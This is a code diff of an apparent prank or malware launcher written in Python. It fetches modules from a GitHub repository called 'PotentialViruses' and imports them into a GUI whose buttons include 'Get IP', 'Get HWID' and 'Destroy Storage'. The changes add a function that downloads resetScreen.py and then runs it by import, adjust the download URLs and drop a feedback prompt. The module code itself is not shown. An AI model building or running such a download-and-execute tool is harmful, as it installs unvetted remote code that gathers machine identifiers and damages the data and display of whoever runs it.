@@ -109,6 +109,7 @@ def download_py(url, save_path):
                 
     else:
         print("Failed to download python file.")
+        print(response.status_code)
         input()
 
 # Download ICO file
@@ -118,11 +119,27 @@ download_ico(ico_url, save_path)
 print("ICO file download process completed.\n")
 
 def download_python_file(file_name, file_number):
-    url = f"https://raw.githubusercontent.com/Bernso/PotentialViruses/main/{file_name}.py"
+    url = f"https://raw.githubusercontent.com/Bernso/PotentialViruses/main/mainPYfiles/{file_name}.py"
     save_path = os.path.join(filename, f"{file_name}.py")  # Full file path including directory
     download_py(url, save_path)
     print(f"Python {file_number} file download process completed.\n")
 
+def download_py_9():
+    file_name = 'resetScreen'
+    filename = 'Required_Files'
+    response = requests.get('https://raw.githubusercontent.com/Bernso/PotentialViruses/main/mainPYfiles/resetScreen.py')
+    if response.status_code == 200:
+        if os.path.exists(os.path.join(filename, f"{file_name}.py")):
+            print("Python file has already been downloaded")
+            
+        else:
+            try:
+                with open(os.path.join(filename, f"{file_name}.py"), 'wb') as f:
+                    f.write(response.content)
+                print("Python file downloaded successfully!")
+            except Exception as e:
+                print(f"Failed to download Python file.\nError: {e}")
+                input()
 
 try:
     
@@ -143,7 +160,7 @@ try:
     
     download_python_file('minimizeWindows', '8')
     
-    download_python_file('resetScreen.py', '9')
+    download_py_9()
     
     
     print("All python files downloaded successfully!\n")
@@ -174,15 +191,15 @@ button_texts = ["Get IP", "Get HWID", "Destroy Storage", "Create Folders within 
 button_width = 161.70000000000002
 button_height = 70
 try:
-    from Required_Files.getip import get_public_ip
-    from Required_Files.gethwid import get_hwid
-    from Required_Files.gethostname import get_computer_name
-    from Required_Files.getprivip import get_private_ip
-    import Required_Files.rotateScreenConstantly 
-    import Required_Files.minimizeWindows
-    import Required_Files.resetScreen
-    import Required_Files.monkeytown
-    import Required_Files.beanCreatornoUI 
+    from    Required_Files.getip                    import get_public_ip
+    from    Required_Files.gethwid                  import get_hwid
+    from    Required_Files.gethostname              import get_computer_name
+    from    Required_Files.getprivip                import get_private_ip
+    import  Required_Files.rotateScreenConstantly 
+    import  Required_Files.minimizeWindows
+    import  Required_Files.resetScreen
+    import  Required_Files.monkeytown
+    import  Required_Files.beanCreatornoUI 
 except Exception as e:
     print(f"Failed to import python files.\nError: {e}")
     errorReporting(e)
@@ -229,23 +246,7 @@ exitButton.place(x=240, y=280)
 
 
 if __name__ == "__main__":
-    try:
-        print("Starting...")
-        app.mainloop()
+    print("Starting...")
+    app.mainloop()
         
-        user_feedback = input("\nIf you would like any extra support, join the discord: https://discord.gg/E6gkFRMGn2 \nAny feedback? (if you do please type it here)\n")
         
-        if user_feedback != '':
-            print("Thanks for your feedback!")
-            sendFeedback(user_feedback)
-            os.system('cls')
-            print("Application closed.")
-        else:
-            os.system('cls')
-            print("BYE")
-            time.sleep(1)
-            print("Application closed.")
-    except Exception as e:
-        print("Message failed to send, please report this.")
-        errorReporting(e)
-        print(f"Error: {e}")
